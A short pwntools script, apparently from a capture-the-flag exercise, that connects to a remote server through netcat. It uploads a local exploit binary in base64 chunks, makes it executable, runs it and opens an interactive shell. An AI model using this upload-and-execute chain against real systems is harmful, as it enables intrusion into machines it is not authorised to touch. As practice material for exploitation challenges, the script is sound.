from pwn import *
import exploit_helper

# Binary filename
exe = "/bin/netcat"
server_ip = "178.128.173.79"
server_port = "31992"
exploit_path = "cmake-build-debug/exploit"

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = exploit_helper.start(exe=exe, gdb_script=gdb_script, argv=[server_ip, server_port])


def send_command(command: bytes):
    info(f"Sending command '{command}'")
    io.readuntil(b"/ $ ")
    io.sendline(command)


with open(exploit_path, "rb") as exploit_file:
    while (data := exploit_file.read(256)) != b"":
        encoded_data: str = base64.b64encode(data).decode("ascii")
        send_command(f"echo '{encoded_data}' > exploit".encode("ascii"))

send_command(b"chmod +x exploit")

send_command(b"./exploit")

io.interactive()
